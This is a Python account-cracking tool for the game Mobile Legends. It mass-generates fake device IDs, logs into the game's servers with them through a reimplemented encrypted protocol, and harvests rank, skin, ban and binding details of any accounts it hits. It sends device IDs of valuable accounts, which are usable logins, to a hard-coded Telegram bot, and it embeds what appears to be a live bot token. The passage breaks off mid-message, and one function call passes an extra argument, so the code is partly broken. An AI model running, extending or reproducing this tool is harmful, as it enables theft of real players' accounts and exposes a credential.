#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - ULTRA MLBB TOOLS v4.0
# Created by: @Markie678
# Features: Generator + Bulk Check + Rank Filter + V2L + Brute Force + Single Check
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib
import zstandard as zstd, struct, re, requests
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from Crypto.Cipher import AES
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone, timedelta

init(autoreset=True)

# ────────────────────────────────────────────────────────────────
# 1. CONFIGURATION
# ────────────────────────────────────────────────────────────────

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")

# ============================================================
# TELEGRAM CONFIG — EDIT THESE
# ============================================================
TELEGRAM_BOT_TOKEN = "8348359051:AAE1NJ5aKpb1A1eqIoGSaFGxWGvlIZVPxDg"   # Get from @BotFather
TELEGRAM_CHAT_ID = "8214179268"       # Your Telegram user/group ID
# ============================================================

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
SERVER_HOST = 'login.ml.youngjoygame.com'
SERVER_PORT = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'
AVG_BYTES_PER_LINE = 80

HEX_CHARS = "0123456789abcdef"
BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

# Folder structure
FOLDERS = {
    "generated": "00_Generated",
    "split": "00_Split_Devices",
    "login": "01_Login_Success",
    "detail": "03_Hasil_Detail_8Req",
    "rank_warrior": "04_Rank_Warrior",
    "rank_elite": "05_Rank_Elite",
    "rank_master": "06_Rank_Master",
    "rank_gm": "07_Rank_Grandmaster",
    "rank_epic": "08_Rank_Epic",
    "rank_legend": "09_Rank_Legend",
    "rank_mythic": "10_Rank_Mythic",
    "v2l_active": "11_V2L_Active",
    "v2l_inactive": "12_V2L_Inactive",
    "sultan": "13_Sultan",
    "highrank": "14_HighRank",
    "akun_tua": "15_Akun_Tua",
    "checkpoint": "98_Checkpoints",
    "error": "99_Error",
    "bruteforce": "00_BruteForce_Logs",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

FILES = {
    "generated_devices": os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt"),
    "login_valid": os.path.join(OUTPUT_DIR, FOLDERS["login"], "login_valid_devices.txt"),
    "all_hits_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt"),
    "raw_devices_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt"),
    "checkpoint_file": os.path.join(OUTPUT_DIR, FOLDERS["checkpoint"], "scan_checkpoints.json"),
    "error_log": os.path.join(OUTPUT_DIR, FOLDERS["error"], "error_log.txt"),
    "bruteforce_log": os.path.join(OUTPUT_DIR, FOLDERS["bruteforce"], "bruteforce_session.txt"),
}

# ────────────────────────────────────────────────────────────────
# 2. BANNER
# ────────────────────────────────────────────────────────────────

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""
{Fore.MAGENTA}██████╗ ██████╗ ███████╗███╗   ███╗██╗██╗   ██╗███╗   ███╗
{Fore.MAGENTA}██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██║   ██║████╗ ████║
{Fore.CYAN}██████╔╝██████╔╝█████╗  ██╔████╔██║██║██║   ██║██╔████╔██║
{Fore.CYAN}██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║
{Fore.GREEN}██║     ██║  ██║███████╗██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║
{Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.YELLOW}           P R E M I U M   D E V I D   S E K E R
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.LIGHTBLACK_EX}              Created by: {Fore.CYAN}@Markie678{Fore.LIGHTBLACK_EX} | v4.0
{Fore.LIGHTBLACK_EX}═══════════════════════════════════════════════════════════════
{Style.RESET_ALL}
"""
    print(banner)

def print_header(title=""):
    print_banner()
    if title:
        print(f"{Fore.CYAN}┌{'─'*58}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE}{title.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*58}┘{Style.RESET_ALL}\n")

# ────────────────────────────────────────────────────────────────
# 3. TELEGRAM NOTIFICATION & DEDUPLICATION
# ────────────────────────────────────────────────────────────────

def send_telegram(message: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=5)
        return resp.status_code == 200
    except Exception:
        return False

# ─── DEDUPLICATION CACHE ────────────────────────────────────────
_telegram_sent_cache = set()
_telegram_sent_lock = threading.Lock()

def send_telegram_once(device_id: str, message: str) -> bool:
    """Send Telegram message only once per device ID."""
    with _telegram_sent_lock:
        if device_id in _telegram_sent_cache:
            return False
        _telegram_sent_cache.add(device_id)
    
    success = send_telegram(message)
    
    # Clean up cache occasionally
    with _telegram_sent_lock:
        if len(_telegram_sent_cache) > 10000:
            _telegram_sent_cache.clear()
    
    return success

# ────────────────────────────────────────────────────────────────
# 4. RANK MAPPING
# ────────────────────────────────────────────────────────────────

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50: return f"Mythical Glory ({stars}★)"
        if stars >= 25: return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    
    ranks = [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75, "Epic", 5, ["V","IV","III","II","I"]),
        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25, "Master", 4, ["IV","III","II","I"]),
        (10, "Elite", 3, ["IV","III","II","I"]),
        (1, "Warrior", 3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt: return "warrior"
    if "elite" in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt: return "epic"
    if "legend" in rt: return "legend"
    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt:
        return "mythic"
    return "other"

def get_stars_from_rank(rank_text: str) -> int:
    import re
    match = re.search(r'\((\d+)★\)', rank_text)
    if match:
        return int(match.group(1))
    return 0

# ────────────────────────────────────────────────────────────────
# 5. V2L ACCURATE DETECTION
# ────────────────────────────────────────────────────────────────

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None:
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
    except Exception:
        pass

    try:
        conn.send_data(10145, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid in (10146, 10160) and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                    val = data.get(tag)
                    if val is not None:
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
    except Exception:
        pass

    try:
        conn.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10144 and res:
                data = dict(res)
                for tag in [118, 5, 2, 3]:
                    nested = data.get(tag, {})
                    if isinstance(nested, dict):
                        for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                            val = nested.get(subtag)
                            if val is not None:
                                if isinstance(val, (int, float)):
                                    return "Enabled" if int(val) > 0 else "Disabled"
                                if isinstance(val, str):
                                    if val.lower() in ("1", "true", "enabled", "yes"):
                                        return "Enabled"
                                    if val.lower() in ("0", "false", "disabled", "no"):
                                        return "Disabled"
    except Exception:
        pass

    return "N/A"

# ────────────────────────────────────────────────────────────────
# 6. SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]
        tag = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._read_varint().to_bytes(4, 'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8, 'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────
# 7. CONNECTION & GAME PROTOCOL
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(3)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        if res and isinstance(res, dict):
            for v in res.values():
                if isinstance(v, str) and any(b in v.lower() for b in ('ban', 'suspend', 'freeze', 'limit')):
                    self.ban_status = f"BANNED: {v}"
                    return False
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port = res[1].split(':')
            self.game_host = host
            self.game_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                d, h, m, s = binfo.get('endtime_day', '0'), binfo.get('endtime_hour', '0'), binfo.get('endtime_min', '0'), binfo.get('endtime_sec', '0')
                self.ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

# ────────────────────────────────────────────────────────────────
# 8. DEVICE GENERATOR
# ────────────────────────────────────────────────────────────────

REAL_OEM_HASHES = [
    "cd9e459ea708a948d5c2f5a6ca8838cf", "b7f9a1c2d3e4f5061728394a5b6c7d8e",
    "a1c8f304e792b516d8e0349acb1527fe", "f29c4815a73b06de1928475bc0d1e2f3",
    "e50b12789f4ca3612d8e057cb4a193fe", "d41d8cd98f00b204e9800998ecf8427e",
]

def random_hex(n: int) -> str:
    return ''.join(random.choices(HEX_CHARS, k=n))

def random_base64(n: int) -> str:
    return ''.join(random.choices(BASE64_CHARS, k=n))

GEN_FUNCS = {
    "and_standard_full": lambda c: f"and_{random_hex(32)}{random_hex(16)}{uuid.uuid4()}\n",
    "oem_full": lambda c: f"and_{random.choice(REAL_OEM_HASHES)}{random_hex(16)}{uuid.uuid4()}\n",
    "oem_uuid": lambda c: f"and_{random.choice(REAL_OEM_HASHES)}-{uuid.uuid4()}\n",
    "and_md5_uuid": lambda c: f"and_{random_hex(32)}-{uuid.uuid4()}\n",
    "and_16hex_uuid": lambda c: f"and_{random_hex(16)}-{uuid.uuid4()}\n",
    "and_full_none": lambda c: f"and_{random_hex(32)}{random_hex(16)}none\n",
    "and_md5_none": lambda c: f"and_{random_hex(32)}none\n",
    "and_full_zero": lambda c: f"and_{random_hex(32)}{random_hex(16)}00000000-0000-0000-0000-000000000000\n",
    "and_md5_zero": lambda c: f"and_{random_hex(32)}00000000-0000-0000-0000-000000000000\n",
    "ios_standard": lambda c: f"ios_{str(uuid.uuid4()).upper()}\n",
}

REALISTIC_GENERATORS = [
    GEN_FUNCS["and_standard_full"],
    GEN_FUNCS["oem_full"],
    GEN_FUNCS["oem_uuid"],
    GEN_FUNCS["and_md5_uuid"],
    GEN_FUNCS["ios_standard"]
]

def generate_worker(cycle_start: int, count: int, gen_idx_start: int, queue: Queue, generators: list):
    fmt_count = len(generators)
    cycle = cycle_start
    idx = gen_idx_start
    for _ in range(count):
        idx = (idx + 1) % fmt_count
        queue.put(generators[idx](cycle))
        cycle += 1

def writer_thread(queue: Queue, output_file: str):
    buffer = []
    buffer_size = 0
    with open(output_file, "a", encoding="utf-8", buffering=8*1024*1024) as f:
        while True:
            item = queue.get()
            if item is None: break
            buffer.append(item)
            buffer_size += len(item)
            if buffer_size >= 8*1024*1024:
                f.write(''.join(buffer))
                buffer.clear()
                buffer_size = 0
        if buffer:
            f.write(''.join(buffer))

def run_generator(size_mb: float, threads: int = 16, generators=None):
    if generators is None: generators = REALISTIC_GENERATORS
    target_lines = int((size_mb * 1024 * 1024) / AVG_BYTES_PER_LINE * 1.02)
    output_file = FILES["generated_devices"]
    if os.path.exists(output_file): os.remove(output_file)
    
    queue = Queue(maxsize=100000)
    writer = threading.Thread(target=writer_thread, args=(queue, output_file))
    writer.start()
    
    executor = ThreadPoolExecutor(max_workers=threads)
    tasks = []
    chunk_size = 50000
    fmt_count = len(generators)
    lines_left = target_lines
    cycle, idx = 1, 0
    
    while lines_left > 0:
        take = min(chunk_size, lines_left)
        tasks.append(executor.submit(generate_worker, cycle, take, idx, queue, generators, True))
        idx += take
        cycle += idx // fmt_count
        idx %= fmt_count
        lines_left -= take
        
    for future in tasks:
        future.result()
        
    queue.put(None)
    writer.join()
    executor.shutdown()
    print(f"{Fore.GREEN}✓ Generated {target_lines:,} devices to {output_file}{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 9. SAVE ENGINE WITH RANK FILTERING & V2L
# ────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'sultan': 0, 'highrank': 0, 'v2l_active': 0, 'v2l_inactive': 0,
    'akun_tua': 0, 'hero_banyak': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
}
COUNTER_LOCK = threading.Lock()
save_lock = threading.Lock()

def get_rank_file(rank_category: str) -> str:
    rank_files = {
        "warrior": os.path.join(OUTPUT_DIR, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite": os.path.join(OUTPUT_DIR, FOLDERS["rank_elite"], "elite_hits.txt"),
        "master": os.path.join(OUTPUT_DIR, FOLDERS["rank_master"], "master_hits.txt"),
        "gm": os.path.join(OUTPUT_DIR, FOLDERS["rank_gm"], "grandmaster_hits.txt"),
        "epic": os.path.join(OUTPUT_DIR, FOLDERS["rank_epic"], "epic_hits.txt"),
        "legend": os.path.join(OUTPUT_DIR, FOLDERS["rank_legend"], "legend_hits.txt"),
        "mythic": os.path.join(OUTPUT_DIR, FOLDERS["rank_mythic"], "mythic_hits.txt"),
    }
    return rank_files.get(rank_category)

def parse_skin_breakdown(slist: list) -> Dict[str, int]:
    tiers = {'legend_collector': 0, 'epic_zodiac': 0, 'special_starlight': 0, 'elite': 0, 'basic': 0}
    if isinstance(slist, list):
        for s in slist:
            if isinstance(s, dict):
                q = s.get(2, 0)
                if q in (16, 17, 21): tiers['legend_collector'] += 1
                elif q in (7, 15): tiers['epic_zodiac'] += 1
                elif q in (5, 9, 2): tiers['special_starlight'] += 1
                elif q == 1: tiers['elite'] += 1
                else: tiers['basic'] += 1
    return tiers

def is_already_saved(device_id: str, filepath: str) -> bool:
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def should_send_to_telegram(rank_category: str, skin_count: int, highest_rank: str) -> bool:
    if rank_category in ["legend", "mythic"]:
        return True
    if skin_count >= 100:
        return True
    if "Glory" in highest_rank or "Immortal" in highest_rank:
        stars = get_stars_from_rank(highest_rank)
        if stars >= 50:
            return True
    return False

def format_account_card(device: str, acc: int, zone: int, player_data: dict) -> str:
    lines = [
        "═" * 60,
        f"Device ID    : {device}",
        f"Account      : {acc} ({zone})",
        f"Nickname     : {player_data.get('nickname', 'N/A')} (Lv.{player_data.get('level', 'N/A')})",
        f"Status       : NORMAL",
        f"Rank         : {player_data.get('current_rank', 'Unranked')}",
        f"Max Rank     : {player_data.get('highest_rank', 'N/A')}",
        f"Heroes       : {player_data.get('hero_count', 0)}",
        f"Skins        : {player_data.get('skin_count', 0)}",
        f"V2L Status   : {player_data.get('v2l_status', 'N/A')}",
        f"Created      : {player_data.get('created_at', 'N/A')}",
        "═" * 60,
    ]
    return "\n".join(lines)

def save_account(account_info: dict, player_data: dict, mode="detail"):
    global HIT_COUNTERS
    
    device = account_info.get('Device id', '')
    acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')
    
    ban_stat = player_data.get('ban_status', 'NORMAL')
    is_banned = 'ban' in str(ban_stat).lower()
    
    if is_banned:
        banned_file = os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt")
        with save_lock:
            with open(banned_file, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK:
            HIT_COUNTERS['banned'] += 1
        return
    
    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""):
        return
    
    level = player_data.get('level', 'N/A')
    skin = player_data.get('skin_count', 0)
    hero = player_data.get('hero_count', 0)
    
    v2l = player_data.get('v2l_status', 'N/A')
    v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
               "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
    
    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_category = get_rank_category(cur_rank)
    rank_folder = get_rank_file(rank_category)
    highest_rank = player_data.get('highest_rank', 'Unranked')
    
    card_text = format_account_card(device, acc, zone, player_data)
    
    with save_lock:
        all_file = FILES["all_hits_detail"]
        if not is_already_saved(device, all_file):
            with open(all_file, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")
        
        raw_file = FILES["raw_devices_detail"]
        if not is_already_saved(device, raw_file):
            with open(raw_file, "a", encoding='utf-8') as f:
                f.write(f"{device}\n")
        
        if rank_folder and not is_already_saved(device, rank_folder):
            with open(rank_folder, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")
        
        if v2l_text == "ACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1
        
        if skin >= 200:
            sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
            if not is_already_saved(device, sultan_file):
                with open(sultan_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1
    
    send_tg = should_send_to_telegram(rank_category, skin, highest_rank)
    
    if send_tg:
        tg_message = (
            f"🔥 <b>PREMIUM ACCOUNT FOUND!</b>\n"
            f"─────────────────────────\n"
            f"📱 Device    : <code>{device}</code>\n"
            f"🆔 Account   : <b>{acc}</b> ({zone})\n"
            f"👤 Nickname  : <b>{nick}</b> (Lv.{level})\n"
            f"🏆 Rank      : {cur_rank}\n"
            f"⭐ Max Rank  : {highest_rank}\n"
